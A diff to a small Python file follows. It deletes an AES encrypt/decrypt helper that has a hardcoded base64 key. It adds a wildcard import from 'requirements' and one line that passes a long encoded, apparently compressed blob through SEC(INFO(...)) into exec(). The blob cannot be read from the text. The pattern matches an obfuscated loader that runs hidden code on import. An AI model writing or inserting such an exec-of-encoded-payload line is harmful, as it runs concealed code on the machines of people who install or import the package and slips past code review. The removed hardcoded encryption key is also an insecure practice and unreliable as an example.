@@ -1,18 +1,3 @@
+from requirements import *
 
-import base64
-from Crypto import Random
-from Crypto.Cipher import AES
-
-abbrev = '1V3=XUaR20c0W'
-NWA = base64.b64decode('V3FwbXBaVnViOUhucFBLa1ZDRU4yWjR2blJ0OUQ0U0E=')
-
-def encrypt(raw):
-    iv = Random.new().read( AES.block_size )
-    cipher = AES.new(NWA, AES.MODE_CFB, iv )
-    return (base64.b64encode( iv + cipher.encrypt( raw ) ) )
-
-def decrypt(enc):
-    enc = base64.b64decode(enc)
-    iv = enc[:16]
-    cipher = AES.new(NWA, AES.MODE_CFB, iv )
-    return cipher.decrypt( enc[16:] )
+exec(SEC(INFO("eJydkDFvgzAQhXf/Cm+AGlmQIAYkhkJgqNogqCBRqyiyjaPQBowcUpT++toGlA6dai/nu6f3vjOom46LHhJ8YZ4LjoI3MBK3rudwmuS4rXjze4KiujsxMQse41cAMCGCfcEAGk65CnYFzpc2tbcGyDayOboj4rkVo7xiplGukoHsQly2ZZ0WpytNwmfsvK3zwr1tP/IlOT/ZaZHZhR0HhgVAxY6QtVTlmwIPlg+gPLVKHAFRywbTQoLhylRIiJw5/Txc6m8GLS2mI3Wgp0qdbRa6fknX8SFKwoXyG7WC9VfRQvMOLsMVuJI8TFZoBoKSCFrqjqBySd2X8wlUVn99gxLcF5Gvd9/x9v+lnajmdO3neP5eqn4AB5SSzA==")))
